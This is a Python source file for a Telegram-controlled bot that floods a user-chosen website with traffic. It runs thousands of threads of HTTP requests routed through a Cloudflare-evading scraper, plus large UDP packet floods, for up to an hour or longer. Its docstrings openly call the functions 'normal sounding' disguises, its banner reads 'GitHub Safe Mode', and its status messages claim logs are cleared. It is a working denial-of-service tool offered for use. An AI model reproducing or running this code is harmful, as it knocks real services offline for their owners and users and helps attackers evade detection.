import requests
import time
import threading
import random
import socket
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import cloudscraper

import os

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

attack_active = False
current_target = ""
current_threads = 0
current_duration = 0
user_state = {} 

def create_cf_session():
    return cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'desktop': True
        }
    )

def send_request_worker(url):
    """Normal sounding function but does the job"""
    session = create_cf_session()
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while attack_active:
        try:
            session.get(url + f"?_={random.randint(1,999999)}", headers=headers, timeout=3)
            session.post(url, data={"d": random.randint(1,9999)}, timeout=3)
        except:
            session = create_cf_session()

def udp_worker(ip, port):
    """Normal sounding UDP worker"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65500)
    while attack_active:
        try:
            sock.sendto(packet, (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def start_stealth_operation(url, threads, duration_seconds):
    """Main attack orchestrator - normal name"""
    global attack_active
    attack_active = True

    from urllib.parse import urlparse
    parsed = urlparse(url)
    target_host = parsed.hostname
    target_port = 443 if parsed.scheme == "https" else 80
    target_ip = socket.gethostbyname(target_host)

    for _ in range(threads // 2):
        t = threading.Thread(target=send_request_worker, args=(url,))
        t.daemon = True
        t.start()

    for _ in range(threads // 2):
        t = threading.Thread(target=udp_worker, args=(target_ip, target_port))
        t.daemon = True
        t.start()

    time.sleep(duration_seconds)
    attack_active = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    user_state[update.effective_user.id] = {"step": "awaiting_target"}
    
    await update.message.reply_text(
        "🔧 **System Ready** 🔧\n\n"
        "Send me the target URL:\n"
        "Example: `https://sup/login`\n\n"
        "_This is a normal network testing tool_",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    
    state = user_state.get(user_id, {})
    message = update.message.text.strip()

    if state.get("step") == "awaiting_target":
        if message.startswith("http"):
            user_state[user_id] = {"step": "awaiting_threads", "target": message}
            
            keyboard = [
                [InlineKeyboardButton("⚡ 300 Threads", callback_data="threads_300")],
                [InlineKeyboardButton("⚡ 1000 Threads", callback_data="threads_1000")],
                [InlineKeyboardButton("⚡ 2000 Threads", callback_data="threads_2000")],
                [InlineKeyboardButton("⚡ 5000 Threads (Heavy)", callback_data="threads_5000")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"🎯 **Target Set:** `{message}`\n\n"
                f"**Select Thread Count:**",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Send a valid URL starting with http:// or https://")

    elif state.get("step") == "awaiting_custom_duration":
        try:
            duration_value = int(message)
            user_state[user_id]["duration"] = duration_value
            user_state[user_id]["step"] = "done"
            
            await update.message.reply_text(
                f"⏱️ **Duration Set:** {duration_value} seconds\n\n"
                f"🔥 **STARTING OPERATION** 🔥\n"
                f"Target: `{user_state[user_id]['target']}`\n"
                f"Threads: {user_state[user_id]['threads']}\n"
                f"Duration: {duration_value}s\n\n"
                f"⚔️ _System engaged_ ⚔️",
                parse_mode='Markdown'
            )

            def run_attack():
                start_stealth_operation(
                    user_state[user_id]['target'],
                    user_state[user_id]['threads'],
                    duration_value
                )
            
            thread = threading.Thread(target=run_attack)
            thread.start()

            await asyncio.sleep(duration_value)
            await update.message.reply_text(
                f"✅ **Operation Complete** ✅\n\n"
                f"Target: `{user_state[user_id]['target']}`\n"
                f"Duration: {duration_value}s completed\n"
                f"_Logs cleared_",
                parse_mode='Markdown'
            )
            
        except ValueError:
            await update.message.reply_text("❌ Send a valid number (seconds):")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    data = query.data
    user_state_data = user_state.get(user_id, {})

    if data.startswith("threads_"):
        threads = int(data.split("_")[1])
        user_state[user_id]["threads"] = threads
        user_state[user_id]["step"] = "awaiting_custom_duration"
        
        keyboard = [
            [InlineKeyboardButton("⏱️ 10s (Test)", callback_data="dur_10")],
            [InlineKeyboardButton("⏱️ 1m (60s)", callback_data="dur_60")],
            [InlineKeyboardButton("⏱️ 5m (300s)", callback_data="dur_300")],
            [InlineKeyboardButton("⏱️ 1h (3600s)", callback_data="dur_3600")],
            [InlineKeyboardButton("📝 Custom (Type)", callback_data="dur_custom")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🎯 **Target:** `{user_state[user_id]['target']}`\n"
            f"🧵 **Threads:** {threads}\n\n"
            f"**Select Duration:**",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

    elif data.startswith("dur_"):
        duration_map = {
            "dur_10": 10,
            "dur_60": 60,
            "dur_300": 300,
            "dur_3600": 3600
        }
        
        if data in duration_map:
            duration = duration_map[data]
            user_state[user_id]["duration"] = duration
            user_state[user_id]["step"] = "done"
            
            await query.edit_message_text(
                f"🔥 **STARTING OPERATION** 🔥\n\n"
                f"Target: `{user_state[user_id]['target']}`\n"
                f"Threads: {user_state[user_id]['threads']}\n"
                f"Duration: {duration}s\n\n"
                f"⚔️ _System engaged_ ⚔️",
                parse_mode='Markdown'
            )

            def run_attack():
                start_stealth_operation(
                    user_state[user_id]['target'],
                    user_state[user_id]['threads'],
                    duration
                )
            
            thread = threading.Thread(target=run_attack)
            thread.start()

            await asyncio.sleep(duration)
            await query.message.reply_text(
                f"✅ **Operation Complete** ✅\n\n"
                f"Duration: {duration}s completed\n"
                f"_Logs cleared_",
                parse_mode='Markdown'
            )
        
        elif data == "dur_custom":
            user_state[user_id]["step"] = "awaiting_custom_duration"
            await query.edit_message_text(
                "📝 **Type custom duration in seconds:**\n\n"
                "Example: `300` for 5 minutes\n"
                "Example: `3600` for 1 hour",
                parse_mode='Markdown'
            )
#By TorProtest
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active
    if update.effective_user.id != ADMIN_ID:
        return
    attack_active = False
    await update.message.reply_text("🛑 Emergency stop activated.")

import asyncio

app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CallbackQueryHandler(button_handler))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

print("Stealth Bot - GitHub Safe Mode")
app.run_polling()
